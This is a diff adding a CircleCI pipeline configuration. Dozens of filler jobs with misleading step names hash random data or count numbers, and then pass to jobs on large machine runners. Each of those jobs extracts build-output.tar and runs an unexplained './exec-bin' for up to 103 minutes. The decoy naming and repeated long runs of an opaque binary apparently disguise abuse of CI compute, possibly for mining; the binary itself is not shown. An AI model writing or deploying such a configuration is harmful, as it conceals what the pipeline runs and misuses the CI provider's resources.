+            echo "gate wip-edge: $(wc -c </tmp/pipeline/secondary_phase_output.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - secondary_phase_output.log
+  wip-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/secondary_phase_output.log
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  alpha_RunApp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Scan dependency graph
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 386539 | awk 'END{print NR}'; true ; } > /tmp/pipeline/step-4.txt
+            echo "gate RunApp: $(wc -c </tmp/pipeline/step-4.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-4.txt
+  RunApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/step-4.txt
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  cleanup_VERIFY_LAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Scan prime offsets
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1331200 | wc -c; true ; } > /tmp/pipeline/pt-D.pkl
+            echo "gate VERIFY_LAB: $(wc -c </tmp/pipeline/pt-D.pkl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - pt-D.pkl
+  VERIFY_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/pt-D.pkl
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  kick_ruby3-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Checkpoint window frame
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 29360128 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/pipeline/295.out
+            echo "gate ruby3-lint: $(wc -c </tmp/pipeline/295.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 295.out
+  ruby3-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/295.out
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  stepA_Prepare_Staging5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Build frequency table
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 2 60240 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next}print}' | wc -l; true ; } > /tmp/pipeline/2024-10-19.data
+            echo "gate Prepare_Staging5: $(wc -c </tmp/pipeline/2024-10-19.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2024-10-19.data
+  Prepare_Staging5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/2024-10-19.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  db_luna-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Capture job identity
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 2560000 | base64 | head -c 200 | wc -c; true ; } > /tmp/pipeline/cache.raw
+            echo "gate luna-ci: $(wc -c </tmp/pipeline/cache.raw) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - cache.raw
+  luna-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/cache.raw
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+
+  tester_ship-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Compact small objects
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 16850); do printf "%08x\n" $RANDOM; done ) | sort | md5sum; true ; } > /tmp/pipeline/artifact
+            echo "gate ship-it: $(wc -c </tmp/pipeline/artifact) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - artifact
+  p1_ruby3-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Rank ordinal values
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 27262976 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/pipeline/step-15.txt
+            echo "gate ruby3-test: $(wc -c </tmp/pipeline/step-15.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-15.txt
+  p2_validate-full-artifact-bundle_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Reserve scratch region
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=10;a++)for(b=1;b<=27795;b++)s+=a*b;print s}'; true ; } > /tmp/pipeline/DONE
+            echo "gate validate-full-artifact-bundle: $(wc -c </tmp/pipeline/DONE) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - DONE
+  syncer_produce-production-artifact-bundle_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scan vector span
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 1400 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/pipeline/step-27.txt
+            echo "gate produce-production-artifact-bundle: $(wc -c </tmp/pipeline/step-27.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-27.txt
+  cacher_luna-ci_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Measure dwell time
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; yes abc | head -n 324224 | sha256sum; true ; } > /tmp/pipeline/cache.raw
+            echo "gate luna-ci: $(wc -c </tmp/pipeline/cache.raw) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - cache.raw
+  enqueue_helios-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Score sort stability
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 2 12154 | factor | wc -l; true ; } > /tmp/pipeline/payload
+            echo "gate helios-rev: $(wc -c </tmp/pipeline/payload) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - payload
+  hydrate_dec27-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Fold branch counters
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 5120000 | base64 | head -c 200 | wc -c; true ; } > /tmp/pipeline/2024-08-18.data
+            echo "gate dec27-ship: $(wc -c </tmp/pipeline/2024-08-18.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2024-08-18.data
+  orchestrate_RunApp_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Measure throughput
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=1692500;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/pipeline/step-4.txt
+            echo "gate RunApp: $(wc -c </tmp/pipeline/step-4.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-4.txt
+  loader_ruby3-lint_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Snapshot heap stats
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 819200 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/pipeline/295.out
+            echo "gate ruby3-lint: $(wc -c </tmp/pipeline/295.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 295.out
+  drain_APP-323_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute slot digest
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 140176 | awk '{if($1%2)o++;else e++}END{print o"/"e}'; true ; } > /tmp/pipeline/report.out
+            echo "gate APP-323: $(wc -c </tmp/pipeline/report.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - report.out
+  canary_promote_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Collate dictionary rows
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=2;a++)for(b=1;b<=9554;b++)s+=a*b;print s}'; true ; } > /tmp/pipeline/summary.md
+            echo "gate promote: $(wc -c </tmp/pipeline/summary.md) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - summary.md
+  gamma_alpha_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Normalize counter rings
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 235763 | awk '{s+=$1}END{print s}'; true ; } > /tmp/pipeline/465b.txt
+            echo "gate alpha: $(wc -c </tmp/pipeline/465b.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 465b.txt
+  rerun_fire-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=179478;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/pipeline/894x.data
+            echo "gate fire-up: $(wc -c </tmp/pipeline/894x.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 894x.data
+  hook_teh-ci_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Prepare block cipher
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 27262976 /dev/urandom | sha256sum; true ; } > /tmp/pipeline/941v2.data
+            echo "gate teh-ci: $(wc -c </tmp/pipeline/941v2.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 941v2.data
+  kick_green-light-go_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Audit path segments
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 198840; echo "ftr" ) | wc -l; true ; } > /tmp/pipeline/.marker
+            echo "gate green-light-go: $(wc -c </tmp/pipeline/.marker) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .marker
+  cleanup_full-send_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 4082); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/pipeline/24.blob
+            echo "gate full-send: $(wc -c </tmp/pipeline/24.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 24.blob
+  alpha_mike_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Collect env snapshot
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 12582912 | fold -w16 | sort -u | wc -l; true ; } > /tmp/pipeline/log.ndjson
+            echo "gate mike: $(wc -c </tmp/pipeline/log.ndjson) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - log.ndjson
+  env_Package_Tests8_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Compute aggregate hash
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 1126400 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/pipeline/output.out
+            echo "gate Package_Tests8: $(wc -c </tmp/pipeline/output.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - output.out
+  prefetch_VERIFY_LAB_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Weigh batch output
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 271640 | awk '{if($1%2)o++;else e++}END{print o"/"e}'; true ; } > /tmp/pipeline/pt-D.pkl
+            echo "gate VERIFY_LAB: $(wc -c </tmp/pipeline/pt-D.pkl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - pt-D.pkl
+  builder_Verify_Service7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pack vendor fragments
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 243700 | md5sum; true ; } > /tmp/pipeline/audit.ndjson
+            echo "gate Verify_Service7: $(wc -c </tmp/pipeline/audit.ndjson) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - audit.ndjson
+  phase1_delta-5_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Collect retire counts
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 1497150 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/pipeline/step-25.out
+            echo "gate delta-5: $(wc -c </tmp/pipeline/step-25.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-25.out
+  generate_Prepare_Staging5_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Index byte offsets
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 75730 | awk 'END{print NR}'; true ; } > /tmp/pipeline/2024-10-19.data
+            echo "gate Prepare_Staging5: $(wc -c </tmp/pipeline/2024-10-19.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2024-10-19.data
+  warmup_Validate_Pipeline6_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=14 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/pipeline/counts.json
+            echo "gate Validate_Pipeline6: $(wc -c </tmp/pipeline/counts.json) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - counts.json
+  step1_Verify_Pipeline6_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Shape histogram tail
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 204800 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/pipeline/handoff.sig
+            echo "gate Verify_Pipeline6: $(wc -c </tmp/pipeline/handoff.sig) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handoff.sig
+  step1_v2-canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 1400 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/pipeline/gate-pass.log
+            echo "gate v2-canary: $(wc -c </tmp/pipeline/gate-pass.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - gate-pass.log
+workflows:
+  build:
+    jobs:
+      - warmer_ship-it
+      - tester_ship-it_2:
+          requires:
+            - warmer_ship-it
+      - ship-it:
+          requires:
+            - tester_ship-it_2
+      - hydrate_ruby3-test:
+          requires:
+            - tester_ship-it_2
+      - p1_ruby3-test_2:
+          requires:
+            - hydrate_ruby3-test
+      - ruby3-test:
+          requires:
+            - p1_ruby3-test_2
+      - canary1_validate-full-artifact-bundle:
+          requires:
+            - p1_ruby3-test_2
+      - p2_validate-full-artifact-bundle_2:
+          requires:
+            - canary1_validate-full-artifact-bundle
+      - validate-full-artifact-bundle:
+          requires:
+            - p2_validate-full-artifact-bundle_2
+      - warmup_produce-production-artifact-bundle:
+          requires:
+            - p2_validate-full-artifact-bundle_2
+      - syncer_produce-production-artifact-bundle_2:
+          requires:
+            - warmup_produce-production-artifact-bundle
+      - produce-production-artifact-bundle:
+          requires:
+            - syncer_produce-production-artifact-bundle_2
+      - db_luna-ci:
+          requires:
+            - syncer_produce-production-artifact-bundle_2
+      - cacher_luna-ci_2:
+          requires:
+            - db_luna-ci
+      - luna-ci:
+          requires:
+            - cacher_luna-ci_2
+      - kick_helios-rev
+      - enqueue_helios-rev_2:
+          requires:
+            - kick_helios-rev
+      - helios-rev:
+          requires:
+            - enqueue_helios-rev_2
+      - deps_dec27-ship:
+          requires:
+            - enqueue_helios-rev_2
+      - hydrate_dec27-ship_2:
+          requires:
+            - deps_dec27-ship
+      - dec27-ship:
+          requires:
+            - hydrate_dec27-ship_2
+      - alpha_RunApp:
+          requires:
+            - hydrate_dec27-ship_2
+      - orchestrate_RunApp_2:
+          requires:
+            - alpha_RunApp
+      - RunApp:
+          requires:
+            - orchestrate_RunApp_2
+      - kick_ruby3-lint:
+          requires:
+            - orchestrate_RunApp_2
+      - loader_ruby3-lint_2:
+          requires:
+            - kick_ruby3-lint
+      - ruby3-lint:
+          requires:
+            - loader_ruby3-lint_2
+      - B_APP-323:
+          requires:
+            - loader_ruby3-lint_2
+      - drain_APP-323_2:
+          requires:
+            - B_APP-323
+      - APP-323:
+          requires:
+            - drain_APP-323_2
+      - sys_promote:
+          requires:
+            - drain_APP-323_2
+      - canary_promote_2:
+          requires:
+            - sys_promote
+      - promote:
+          requires:
+            - canary_promote_2
+      - teardown_alpha
+      - gamma_alpha_2:
+          requires:
+            - teardown_alpha
+      - alpha:
+          requires:
+            - gamma_alpha_2
+      - preinit_fire-up:
+          requires:
+            - gamma_alpha_2
+      - rerun_fire-up_2:
+          requires:
+            - preinit_fire-up
+      - fire-up:
+          requires:
+            - rerun_fire-up_2
+      - teardown_teh-ci:
+          requires:
+            - rerun_fire-up_2
+      - hook_teh-ci_2:
+          requires:
+            - teardown_teh-ci
+      - teh-ci:
+          requires:
+            - hook_teh-ci_2
+      - produce_green-light-go:
+          requires:
+            - hook_teh-ci_2
+      - kick_green-light-go_2:
+          requires:
+            - produce_green-light-go
+      - green-light-go:
+          requires:
+            - kick_green-light-go_2
+      - maker_full-send:
+          requires:
+            - kick_green-light-go_2
+      - cleanup_full-send_2:
+          requires:
+            - maker_full-send
+      - full-send:
+          requires:
+            - cleanup_full-send_2
+      - inspect_mike:
+          requires:
+            - cleanup_full-send_2
+      - alpha_mike_2:
+          requires:
+            - inspect_mike
+      - mike:
+          requires:
+            - alpha_mike_2
+      - retry_Package_Tests8:
+          requires:
+            - alpha_mike_2
+      - env_Package_Tests8_2:
+          requires:
+            - retry_Package_Tests8
+      - Package_Tests8:
+          requires:
+            - env_Package_Tests8_2
+      - cleanup_VERIFY_LAB:
+          requires:
+            - env_Package_Tests8_2
+      - prefetch_VERIFY_LAB_2:
+          requires:
+            - cleanup_VERIFY_LAB
+      - VERIFY_LAB:
+          requires:
+            - prefetch_VERIFY_LAB_2
+      - compile_bob-run
+      - bob-run:
+          requires:
+            - compile_bob-run
+      - precheck_cerberus-v2
+      - cerberus-v2:
+          requires:
+            - precheck_cerberus-v2
+      - green_CHECK_PROD:
+          requires:
+            - precheck_cerberus-v2
+      - CHECK_PROD:
+          requires:
+            - green_CHECK_PROD
+      - fetcher_wip-edge:
+          requires:
+            - green_CHECK_PROD
+      - wip-edge:
+          requires:
+            - fetcher_wip-edge
+      - audit_wip-cache:
+          requires:
+            - fetcher_wip-edge
+      - wip-cache:
+          requires:
+            - audit_wip-cache
+      - green_Verify_Service7
+      - builder_Verify_Service7_2:
+          requires:
+            - green_Verify_Service7
+      - Verify_Service7:
+          requires:
+            - builder_Verify_Service7_2
+      - canary1_delta-5:
+          requires:
+            - builder_Verify_Service7_2
+      - phase1_delta-5_2:
+          requires:
+            - canary1_delta-5
+      - delta-5:
+          requires:
+            - phase1_delta-5_2
+      - stepA_Prepare_Staging5:
+          requires:
+            - phase1_delta-5_2
+      - generate_Prepare_Staging5_2:
+          requires:
+            - stepA_Prepare_Staging5
+      - Prepare_Staging5:
+          requires:
+            - generate_Prepare_Staging5_2
+      - redo_Validate_Pipeline6:
+          requires:
+            - generate_Prepare_Staging5_2
+      - warmup_Validate_Pipeline6_2:
+          requires:
+            - redo_Validate_Pipeline6
+      - Validate_Pipeline6:
+          requires:
+            - warmup_Validate_Pipeline6_2
+      - package_Verify_Pipeline6:
+          requires:
+            - warmup_Validate_Pipeline6_2
+      - step1_Verify_Pipeline6_2:
+          requires:
+            - package_Verify_Pipeline6
+      - Verify_Pipeline6:
+          requires:
+            - step1_Verify_Pipeline6_2
+      - teardown_v2-canary:
+          requires:
+            - step1_Verify_Pipeline6_2
+      - step1_v2-canary_2:
+          requires:
+            - teardown_v2-canary
+      - v2-canary:
+          requires:
+            - step1_v2-canary_2
